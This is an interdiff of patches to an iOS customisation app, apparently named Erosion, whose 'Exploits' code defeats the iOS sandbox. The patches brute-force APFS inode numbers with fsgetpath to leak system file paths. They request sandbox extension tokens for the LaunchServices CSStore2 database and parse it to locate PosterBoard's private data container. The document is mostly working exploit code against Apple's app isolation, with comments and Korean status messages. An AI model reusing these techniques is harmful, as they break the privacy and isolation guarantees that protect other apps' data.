@@ -1,8 +1,8 @@
 diff --git a/Erosion/Exploits/WorseQuerySwift.swift b/Erosion/Exploits/WorseQuerySwift.swift
-index 7d30b6a..595b512 100644
+index 7d30b6a..325e9e1 100644
 --- a/Erosion/Exploits/WorseQuerySwift.swift
 +++ b/Erosion/Exploits/WorseQuerySwift.swift
-@@ -12,13 +12,62 @@ let wq = WorseQuery()
+@@ -12,13 +12,84 @@ let wq = WorseQuery()
  var group = "group.com.jbdotparty.Erosion.WQ"
  
  class WorseQuery {
@@ -46,8 +46,7 @@ index 7d30b6a..595b512 100644
 +        // exists. A healthy cache is never touched by the startup check.
 +        guard worse_query_recover_cache(group) == 0 else {
 +            return "공유 App Group 캐시 복구 상태를 확인하지 못했습니다. 기존 데이터를 보존하고 접근을 차단합니다."
-         }
--        return "group.com.jbdotparty.Erosion.WQ"
++        }
 +        let caches = container.appendingPathComponent("Library/Caches")
 +        let fm = FileManager.default
 +        if let attributes = try? fm.attributesOfItem(atPath: caches.path) {
@@ -61,15 +60,38 @@ index 7d30b6a..595b512 100644
 +        }
 +        if fm.fileExists(atPath: caches.path) {
 +            return "App Group 캐시의 파일 유형을 확인하지 못했습니다. 접근 차단."
-+        }
+         }
+-        return "group.com.jbdotparty.Erosion.WQ"
 +        return "App Group 권한 및 캐시 보존·복구 준비됨 (Caches 폴더 없음). 실제 쓰기 권한은 별도 검증 필요."
      }
 -    
 +
++    /// Read-only access grant for the lsd CSStore2 file. Unlike the older
++    /// grantAccess helper it does not demand writability of a system file.
++    /// Returned handle remains consumed until the caller reads and releases it.
++    func grantReadAccess(path: String) -> (Bool, Int64, String) {
++        let state = preflight()
++        guard state.hasPrefix("App Group 권한 및") else { return (false, -7, state) }
++        guard !path.isEmpty && path.contains("/Library/Caches/com.apple.LaunchServices-")
++              && path.hasSuffix(".csstore") else {
++            return (false, -254, "LaunchServices 저장소 경로 검증 실패")
++        }
++        let handle = worse_query(path, group, false, false)
++        guard handle >= 0 else {
++            return (false, handle, "LaunchServices 읽기 권한 요청 실패: \(handle)")
++        }
++        guard let file = FileHandle(forReadingAtPath: path) else {
++            worse_query_release(handle)
++            return (false, -255, "샌드박스 토큰 발급 후에도 LaunchServices 데이터베이스 읽기 거부")
++        }
++        try? file.close()
++        return (true, handle, "read only grant verified")
++    }
++
      func grantAccess(path: String) -> (Bool, Int64, String) {
          let res: Int64
          
-@@ -26,6 +75,13 @@ class WorseQuery {
+@@ -26,6 +97,13 @@ class WorseQuery {
              return (false, 0, "i don't believe you")
          }
          
@@ -83,7 +105,7 @@ index 7d30b6a..595b512 100644
          if path.contains("/var/mobile/Containers/Shared/AppGroup") && ProcessInfo.processInfo.operatingSystemVersion.majorVersion == 26 {
              res = worse_query(path, group, true, false)
          } else {
-@@ -40,6 +96,10 @@ class WorseQuery {
+@@ -40,6 +118,10 @@ class WorseQuery {
          case -4: errorString = "failed to create symlink"
          case -5: errorString = "query rejected"
          case -6: errorString = "kernel refused extension issue"
@@ -95,10 +117,10 @@ index 7d30b6a..595b512 100644
          default: errorString = nil
          }
 diff --git a/Erosion/Exploits/pathleak.h b/Erosion/Exploits/pathleak.h
-index 538eef8..0d4f77a 100644
+index 538eef8..0b4b742 100644
 --- a/Erosion/Exploits/pathleak.h
 +++ b/Erosion/Exploits/pathleak.h
-@@ -29,5 +29,13 @@
+@@ -29,5 +29,18 @@
  #import <Foundation/Foundation.h>
  
  NSArray<NSString *> *pathleak(NSString *filter, uint64_t max_inode);
@@ -110,21 +132,32 @@ index 538eef8..0d4f77a 100644
 +NSString * _Nullable posterboard_container_manager_path(void);
 +/// Aggregated iOS container-manager query result, without filesystem paths.
 +NSString *posterboard_container_manager_diagnostics(void);
++// Find the actual lsd LaunchServices CSStore2 database via read-only inode
++// enumeration; grant/read it explicitly, never guess a PosterBoard UUID.
++NSString * _Nullable posterboard_lsstore_file(uint64_t max_inode);
++NSDictionary<NSString *, id> *posterboard_lsstore_parse(NSData *data);
++
  
  #endif /* pathleak_h */
 diff --git a/Erosion/Exploits/pathleak.m b/Erosion/Exploits/pathleak.m
-index 7ea6185..b6e0fdc 100644
+index 7ea6185..cb870c1 100644
 --- a/Erosion/Exploits/pathleak.m
 +++ b/Erosion/Exploits/pathleak.m
-@@ -24,6 +24,7 @@
+@@ -24,8 +24,13 @@
  */
  
  #import <Foundation/Foundation.h>
 +#include <dlfcn.h>
++#include "PosterBoardLSStoreCore.h"
  #include <sys/fsgetpath.h>
  #include <sys/mount.h>
++#include <fcntl.h>
++#include <unistd.h>
++#include <limits.h>
  
-@@ -79,3 +80,151 @@ NSArray<NSString *> *pathleak(NSString *path, uint64_t max_inode) {
+ // This is just a rewrite of bad_query_list to return an NSString array and run faster
+ // The way this works is literally just brute-forcing inodes and doing fsgetpath until it gets a matching path, lol.
+@@ -79,3 +84,252 @@ NSArray<NSString *> *pathleak(NSString *path, uint64_t max_inode) {
      }
      return result;
  }
@@ -275,6 +308,107 @@ index 7ea6185..b6e0fdc 100644
 +    setPosterboardManagerLookupSummary(summary);
 +    NSLog(@"(pb) container manager summary: %@", summary);
 +    return found;
++}
++
++// A separate identity source on iOS 27.2: lsd's CSStore2 has application
++// bundle IDs paired with data-container paths. WQFiles 0.9.6 uses this when
++// container-manager enumeration exposes only the few allowed host containers.
++// Select the latest lsd CSStore from recently allocated APFS object IDs,
++ // following WQFiles' bounded newest-first file-ID scan. A fixed 10m upper
++ // bound misses system files on devices with larger APFS inode numbers.
++static BOOL posterboardIsLSStorePath(NSString *raw) {
++    if (!raw.length) return NO;
++    NSString *p=[raw hasPrefix:@"/private/var/"] ? [raw substringFromIndex:8] : raw;
++    NSString *prefix=@"/var/mobile/Containers/Data/InternalDaemon/";
++    if (![p hasPrefix:prefix] || ![p hasSuffix:@".csstore"] ||
++        p.length < prefix.length + 36 + 42) return NO;
++    NSString *uuid=[p substringWithRange:NSMakeRange(prefix.length,36)];
++    if (![[NSUUID alloc] initWithUUIDString:uuid]) return NO;
++    NSString *rest=[p substringFromIndex:prefix.length+36];
++    if (![rest hasPrefix:@"/Library/Caches/com.apple.LaunchServices-"]) return NO;
++    NSString *filename=p.lastPathComponent;
++    return [filename hasPrefix:@"com.apple.LaunchServices-"] &&
++           [filename hasSuffix:@".csstore"];
++}
++
++NSString *posterboard_lsstore_file(uint64_t ignored_max_inode) {
++    (void)ignored_max_inode;  // no fixed upper bound: probe this volume first.
++    struct statfs volume={0};
++    if (statfs("/private/var", &volume)!=0) {
++        NSLog(@"(pb-ls) unable to inspect APFS volume");
++        return nil;
++    }
++    NSString *probe=[NSTemporaryDirectory() stringByAppendingPathComponent:
++                     [NSString stringWithFormat:@"erosion-ls-probe-%@",NSUUID.UUID.UUIDString]];
++    int fd=open(probe.fileSystemRepresentation,O_CREAT|O_EXCL|O_WRONLY,0600);
++    if (fd<0) { NSLog(@"(pb-ls) no writable temporary inode probe"); return nil; }
++    struct stat st={0};
++    struct statfs sourceVolume={0};
++    BOOL valid=(fstat(fd,&st)==0 && fstatfs(fd,&sourceVolume)==0);
++    close(fd);
++    unlink(probe.fileSystemRepresentation);
++    if (!valid || memcmp(&sourceVolume.f_fsid,&volume.f_fsid,sizeof(fsid_t)) ||
++        st.st_ino<=0 || (uint64_t)st.st_ino>INT64_MAX-100000) {
++        NSLog(@"(pb-ls) inode probe is not on the expected volume");
++        return nil;
++    }
++    // lsd rewrites CSStore on app install. Its object id is usually among the
++    // newest on the volume. Stop after a bounded interval instead of scanning
++    // old system files indefinitely.
++    int64_t maxInode=(int64_t)st.st_ino+100000;
++    const int64_t chunk=32768;
++    const int64_t chunks=(maxInode+chunk-1)/chunk;
++    CFAbsoluteTime started=CFAbsoluteTimeGetCurrent();
++    NSLock *lock=[NSLock new];
++    __block int64_t nextChunk=0;
++    __block NSString *found=nil;
++    NSUInteger workers=MAX((NSUInteger)1,MIN((NSUInteger)4,
++                             NSProcessInfo.processInfo.activeProcessorCount/2));
++    dispatch_apply(workers,dispatch_get_global_queue(QOS_CLASS_UTILITY,0),
++                   ^(size_t unused) {
++        (void)unused;
++        char buffer[PATH_MAX];
++        fsid_t fsid=volume.f_fsid;
++        while (true) {
++            [lock lock];
++            int64_t c=nextChunk++;
++            BOOL stop=found!=nil ||
++                      CFAbsoluteTimeGetCurrent()-started>20.0 || c>=chunks;
++            [lock unlock];
++            if (stop) return;
++            int64_t high=maxInode-c*chunk;
++            int64_t low=MAX((int64_t)1,high-chunk+1);
++            for(int64_t inode=high;inode>=low;--inode) {
++                if ((inode&127)==0 && CFAbsoluteTimeGetCurrent()-started>20.0)
++                    return;
++                if(fsgetpath(buffer,sizeof(buffer),&fsid,(uint64_t)inode)<=0)
++                    continue;
++                NSString *candidate=[NSString stringWithUTF8String:buffer];
++                if (!posterboardIsLSStorePath(candidate))continue;
++                [lock lock];
++                if(!found)found=candidate;
++                [lock unlock];
++                return;
++            }
++        }
++    });
++    NSLog(@"(pb-ls) recent-inode CSStore search: %@",found?@"found":@"not found");
++    return found;
++}
++
++NSDictionary<NSString *,id>* posterboard_lsstore_parse(NSData *data) {
++    PBLSResult result=pbls_parse(data.bytes,data.length);
++    NSString *path=result.verified?[NSString stringWithUTF8String:result.container]:@"";
++    return @{
++        @"verified":@(result.verified),
++        @"path":path?:@"",
++        @"stringIDs":@(result.stringsFound),
++        @"pathRefs":@(result.pathReferences),
++        @"layoutScore":@(result.layoutScore),
++        @"targetMatches":@(result.recordsMatched),
++        @"conflicts":@(result.conflicting),
++        @"layout":@(result.selectedLayout)
++    };
 +}
 diff --git a/Erosion/Exploits/worse_query.h b/Erosion/Exploits/worse_query.h
 index 0275bb9..8344382 100644
@@ -582,10 +716,10 @@ index 032a355..a3b4c09 100644
  }
  
 diff --git a/Erosion/Helpers/Functions/FSHandlers.swift b/Erosion/Helpers/Functions/FSHandlers.swift
-index 5648c7b..8de2d07 100644
+index 5648c7b..ccebcb6 100644
 --- a/Erosion/Helpers/Functions/FSHandlers.swift
 +++ b/Erosion/Helpers/Functions/FSHandlers.swift
-@@ -11,59 +11,106 @@ import UIKit
+@@ -11,59 +11,160 @@ import UIKit
  let fsHandlers = FSHandlers()
  
  class FSHandlers {
@@ -647,7 +781,9 @@ index 5648c7b..8de2d07 100644
 +        if !primary.isEmpty {
 +            print("(fs) pathleak found \(primary.count) entries")
 +            return primary
-+        }
+         }
+-        
+-        return paths
 +
 +        // Erosion 0.3 used a 10-million inode bound. 0.3.1 replaced it with a
 +        // freshly created guest file's inode, which may fall BELOW the system
@@ -659,14 +795,57 @@ index 5648c7b..8de2d07 100644
 +            let fallback = pathleak(path, fallbackBound) ?? []
 +            print("(fs) legacy bounded scan found \(fallback.count) entries")
 +            return fallback
-         }
--        
--        return paths
++        }
 +        print("(fs) no container paths found via direct listing or inode scan")
 +        return []
      }
 -    
 -    func getContainerPath(at containerURL: URL = FSURL.appContainers, forMatch match: String, hashOnly: Bool = false) -> String {
++
++    // Separate from the iOS 27.2 container-manager API: read the lsd
++    // LaunchServices database used by WQFiles to resolve bundle identities.
++    // This runs only after an explicit Fetch Path button, never on app launch.
++    private func posterBoardPathViaLSStore() -> String? {
++        guard let storePath = posterboard_lsstore_file(10_000_000) else {
++            lastDiscovery = "LaunchServices 대안 조회: lsd 데이터베이스를 제한된 inode 탐색에서 찾지 못했습니다."
++            return nil
++        }
++        let access = wq.grantReadAccess(path: storePath)
++        guard access.0 else {
++            lastDiscovery = "LaunchServices 파일 발견, 읽기 권한 실패: \(access.2)"
++            return nil
++        }
++        defer { wq.releaseHandle(access.1) }
++        guard let props = try? FileManager.default.attributesOfItem(atPath: storePath),
++              let number = props[.size] as? NSNumber else {
++            lastDiscovery = "LaunchServices 파일을 찾았지만 크기/유형 검증에 실패했습니다."
++            return nil
++        }
++        let length = number.intValue
++        guard length >= 4096 && length <= 64 * 1024 * 1024,
++              (props[.type] as? FileAttributeType) == .typeRegular else {
++            lastDiscovery = "LaunchServices 데이터베이스의 크기 또는 유형이 허용 범위를 벗어났습니다."
++            return nil
++        }
++        guard let bytes = try? Data(contentsOf: URL(fileURLWithPath: storePath),
++                                   options: .mappedIfSafe),
++              bytes.count == length else {
++            lastDiscovery = "LaunchServices 데이터베이스를 일관되게 읽지 못했습니다."
++            return nil
++        }
++        let result = posterboard_lsstore_parse(bytes as NSData)
++        let accepted = (result["verified"] as? Bool) ?? false
++        let matches = (result["targetMatches"] as? NSNumber)?.intValue ?? 0
++        let score = (result["layoutScore"] as? NSNumber)?.intValue ?? 0
++        let refs = (result["pathRefs"] as? NSNumber)?.intValue ?? 0
++        let conflicts = (result["conflicts"] as? NSNumber)?.intValue ?? 0
++        guard accepted, let path = result["path"] as? String, !path.isEmpty else {
++            lastDiscovery = "LaunchServices 대안 조회 실패: 유효 경로 참조 \(refs)개, 레이아웃 검증 \(score)개, PosterBoard 매칭 \(matches)개, 충돌 \(conflicts)개. 앱 식별자 확인 전에는 경로를 사용하지 않습니다."
++            return nil
++        }
++        lastDiscovery = "LaunchServices 검증 완료: 앱 식별자 com.apple.PosterBoard와 경로가 일치함 (근거 레코드 \(score)개). PosterBoard 실제 쓰기 권한은 별도 확인 필요."
++        return path
++    }
 +
 +    func getContainerPath(at containerURL: URL = FSURL.appContainers, forMatch match: String,
 +                          hashOnly: Bool = false, allowPrivateAccess: Bool = false) -> String {
@@ -683,7 +862,16 @@ index 5648c7b..8de2d07 100644
 +                ? URL(fileURLWithPath: verified).lastPathComponent
 +                : verified
 +        }
-+        let nativeQueryResult = posterboard_container_manager_diagnostics()
++        let nativeQueryResult = posterboard_container_manager_diagnostics() ?? "컨테이너 관리자 응답 없음"
++        if match == "com.apple.PosterBoard", allowPrivateAccess,
++           let resolved = posterBoardPathViaLSStore() {
++            return hashOnly
++                ? URL(fileURLWithPath: resolved).lastPathComponent
++                : resolved
++        }
++        // Preserve the alternate source's precise failure reason when direct
++        // listing and xattr checks cannot identify a matching container.
++        let lsFailure = allowPrivateAccess ? lastDiscovery : "수동 조회 전용"
 +        if match == "com.apple.PosterBoard", !hashOnly,
 +           let candidate = pathleak_posterboard(10_000_000) {
 +            // Marker-derived path is not automatically trusted. Verify its
@@ -719,7 +907,7 @@ index 5648c7b..8de2d07 100644
          }
 -        print("(fs) failed to get container for \(match)! containers: \(containerURL.path)")
 +        let method = allowPrivateAccess ? "컨테이너 관리자 및 권한 대체 조회" : "읽기 전용 조회"
-+        lastDiscovery = "\(method) 실패: \(nativeQueryResult). 후보 \(containers.count)개, xattr/메타데이터 식별 \(readable)개. 경로를 추측하거나 256개 후보에 쓰기 권한을 요청하지 않았습니다. \(wq.preflight())"
++        lastDiscovery = "\(method) 실패: \(nativeQueryResult). 후보 \(containers.count)개, xattr/메타데이터 식별 \(readable)개. LaunchServices: \(lsFailure). 임의 경로 쓰기는 차단. \(wq.preflight())"
 +        print("(fs) \(lastDiscovery)")
          return ""
      }
@@ -1318,5 +1506,172 @@ index 0000000..cdbe6f4
 +        if (x != y) return x < y ? NSOrderedAscending : NSOrderedDescending;
 +    }
 +    return NSOrderedSame;
++}
++#endif
+diff --git a/Erosion/Exploits/PosterBoardLSStoreCore.h b/Erosion/Exploits/PosterBoardLSStoreCore.h
+new file mode 100644
+index 0000000..f31149e
+--- /dev/null
++++ b/Erosion/Exploits/PosterBoardLSStoreCore.h
+@@ -0,0 +1,161 @@
++/*
++ * Narrow, bounded CSStore2 parser for one exact bundle identity:
++ * com.apple.PosterBoard -> Data/Application/<UUID>.
++ * Derived from WQFiles WQLaunchServices.m (GPL-3.0-or-later), 0d9c28c.
++ * This parser is intentionally READ ONLY and never treats a plain UUID
++ * as sufficient proof of identity. For unknown/partial layouts it FAILS.
++ */
++#ifndef POSTERBOARD_LS_STORE_CORE_H
++#define POSTERBOARD_LS_STORE_CORE_H
++#include <stdint.h>
++#include <stddef.h>
++#include <stdlib.h>
++#include <string.h>
++#include <stdio.h>
++#include <stdbool.h>
++#include <ctype.h>
++
++#define PBLS_MAX_BYTES (64u*1024u*1024u)
++#define PBLS_MAX_PATHS 20000u
++#define PBLS_MAX_IDS 32u
++#define PBLS_PATH_SIZE 160u
++
++typedef struct {
++    uint32_t ref;
++    char path[PBLS_PATH_SIZE];
++    bool conflicted;
++} PBLSPath;
++typedef struct {
++    bool verified;
++    char container[PBLS_PATH_SIZE];
++    size_t stringsFound, pathReferences, recordsMatched, matchedIDs, conflicting,
++        layoutScore, layoutsTried;
++    int selectedLayout;
++} PBLSResult;
++static inline uint32_t pbls_u32(const uint8_t *p) {
++    return (uint32_t)p[0] | ((uint32_t)p[1]<<8) |
++           ((uint32_t)p[2]<<16) | ((uint32_t)p[3]<<24);
++}
++static inline bool pbls_uuid36(const char *p) {
++    for (size_t i=0; i<36; ++i) {
++        char c=p[i];
++        if (i==8||i==13||i==18||i==23) {
++            if (c!='-') return false;
++        } else if (!isxdigit((unsigned char)c)) return false;
++    }
++    return true;
++}
++static inline bool pbls_container_path(const char *s,size_t len) {
++    const char *privatePrefix="/private/var/mobile/Containers/Data/Application/";
++    const char *mobilePrefix="/var/mobile/Containers/Data/Application/";
++    size_t n1=strlen(privatePrefix),n2=strlen(mobilePrefix);
++    const char *uuid=NULL;
++    if ((len==n1+36 || len==n1+37) && !memcmp(s,privatePrefix,n1)) {
++        if(len==n1+37&&s[len-1]!='/') return false;
++        uuid=s+n1;
++    } else if ((len==n2+36 || len==n2+37)&&!memcmp(s,mobilePrefix,n2)) {
++        if(len==n2+37&&s[len-1]!='/') return false;
++        uuid=s+n2;
++    }
++    return uuid&&pbls_uuid36(uuid);
++}
++static inline PBLSPath *pbls_path_by_ref(PBLSPath *items,size_t n,uint32_t ref) {
++    for(size_t i=0;i<n;++i)if(items[i].ref==ref)return items+i;
++    return NULL;
++}
++static inline bool pbls_has_ref(const uint32_t *items,size_t n,uint32_t value) {
++    for(size_t i=0;i<n;++i)if(items[i]==value)return true;
++    return false;
++}
++static inline PBLSResult pbls_parse(const void *data,size_t size) {
++    PBLSResult r={0};
++    if(!data||size<0x1000||size>PBLS_MAX_BYTES) return r;
++    const uint8_t *b=(const uint8_t*)data;
++    if(memcmp(b,"bdsl",4))return r;
++    const char *target="com.apple.PosterBoard";
++    size_t targetlen=strlen(target);
++    uint32_t targetRefs[PBLS_MAX_IDS]={0};
++    size_t targetCount=0;
++    PBLSPath *paths=(PBLSPath*)calloc(PBLS_MAX_PATHS,sizeof(PBLSPath));
++    if(!paths)return r;
++    size_t pathCount=0;
++    // A string entry is [u32 id][u32 byte-length][bytes]. Record references
++    // to it are (id << 2). Layout selection follows WQFiles' known offsets.
++    for(size_t off=0;off+8<size;off+=4) {
++        uint32_t id=pbls_u32(b+off),len=pbls_u32(b+off+4);
++        if(id==0||id>=0x01000000u||len==0||len>=PBLS_PATH_SIZE ||
++           len>size-off-8)continue;
++        const uint8_t *str=b+off+8;
++        if(len==targetlen&&!memcmp(str,target,targetlen)) {
++            if(targetCount<PBLS_MAX_IDS&&!pbls_has_ref(targetRefs,targetCount,id<<2))
++                targetRefs[targetCount++]=id<<2;
++            continue;
++        }
++        if(!pbls_container_path((const char*)str,len))continue;
++        if(pathCount>=PBLS_MAX_PATHS)goto finish;
++        // CSStore string IDs can alias different strings on iOS 26; never
++        // trust a path reference that points to two different paths.
++        PBLSPath *existing=pbls_path_by_ref(paths,pathCount,id<<2);
++        if(existing) {
++            char normalized[PBLS_PATH_SIZE]={0};
++            memcpy(normalized,str,len);
++            if(len&&normalized[len-1]=='/')normalized[len-1]=0;
++            if(strcmp(existing->path,normalized)) existing->conflicted=true;
++            continue;
++        }
++        PBLSPath *item=&paths[pathCount++];
++        item->ref=id<<2;
++        memcpy(item->path,str,len);
++        if(item->path[len-1]=='/')item->path[len-1]=0;
++    }
++    r.stringsFound=targetCount;
++    r.pathReferences=pathCount;
++    if(!targetCount||!pathCount)goto finish;
++    struct PBLSLayout {uint32_t size,bundleOff,pathOff;};
++    const struct PBLSLayout layout[]={
++      {0x25c,0x0c,0x6c}, {0x25c,0x10,0x6c},
++      {0x250,0x0c,0x68}, {0x23c,0x0c,0x64}
++    };
++    size_t bestScore=0,bestMatches=0,bestConflict=0;
++    char bestPath[PBLS_PATH_SIZE]={0};
++    int best=-1;
++    for(size_t li=0;li<sizeof(layout)/sizeof(layout[0]);++li) {
++        const struct PBLSLayout L=layout[li];
++        size_t score=0,match=0,conflict=0;
++        char candidate[PBLS_PATH_SIZE]={0};
++        for(size_t off=0;off+8+L.size<=size;off+=4) {
++            if(pbls_u32(b+off+4)!=L.size)continue;
++            const uint8_t *row=b+off+8;
++            uint32_t idref=pbls_u32(row+L.bundleOff);
++            uint32_t pathref=pbls_u32(row+L.pathOff);
++            if(!idref||!pathref)continue;
++            PBLSPath *path=pbls_path_by_ref(paths,pathCount,pathref);
++            if(!path||path->conflicted)continue;
++            score++;
++            if(!pbls_has_ref(targetRefs,targetCount,idref))continue;
++            match++;
++            if(!candidate[0])strncpy(candidate,path->path,sizeof(candidate)-1);
++            else if(strcmp(candidate,path->path))conflict++;
++        }
++        r.layoutsTried++;
++        if(score>bestScore) {
++            bestScore=score;bestMatches=match;bestConflict=conflict;
++            best=(int)li;memcpy(bestPath,candidate,sizeof(bestPath));
++        }
++    }
++    r.layoutScore=bestScore;r.selectedLayout=best;
++    r.recordsMatched=bestMatches;r.conflicting=bestConflict;
++    r.matchedIDs=bestMatches;
++    // The source contains many app containers. A spurious record layout may
++    // accidentally match a single target: accept only coverage >= 50% of
++    // path references when there are at least 20, and >= 8 layout matches.
++    if(bestScore<8 || bestMatches<1 || bestConflict ||
++       (pathCount>=20 && bestScore*2<pathCount))goto finish;
++    if(!pbls_container_path(bestPath,strlen(bestPath)))goto finish;
++    memcpy(r.container,bestPath,sizeof(r.container));
++    r.verified=true;
++finish:
++    free(paths);
++    return r;
 +}
 +#endif
